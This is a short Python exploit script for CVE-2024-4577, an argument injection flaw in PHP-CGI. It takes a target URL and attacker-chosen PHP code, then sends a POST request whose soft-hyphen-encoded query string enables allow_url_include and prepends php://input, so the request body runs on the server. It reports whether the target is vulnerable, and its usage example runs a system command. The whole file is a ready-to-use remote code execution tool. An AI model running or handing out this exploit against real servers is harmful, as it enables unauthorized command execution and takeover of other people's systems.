import requests
import argparse
import warnings
warnings.filterwarnings("ignore")

parser = argparse.ArgumentParser(usage="python3 2024-4577.py -t http://target.com/index.php -c \"<?php print_r(system(whoami));?>\"")
parser.add_argument('-t', help='target', required=True)
parser.add_argument('-c', help='to exec code using system()', required=True)
args = parser.parse_args()
if 'http' not in args.t:
    url = 'http://'+args.t
else:
    url = args.t

print("[+] Exploit for CVE-2024-4577")
try:
    r = requests.post(f"{url}?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", data=f"{args.c};vuln")
    if 'vuln' in r.text:
        print(f"[+] {url} Vuln")
    else:
        print(f"[-] {url} Not Vuln")
except Exception as er:
    print(er)
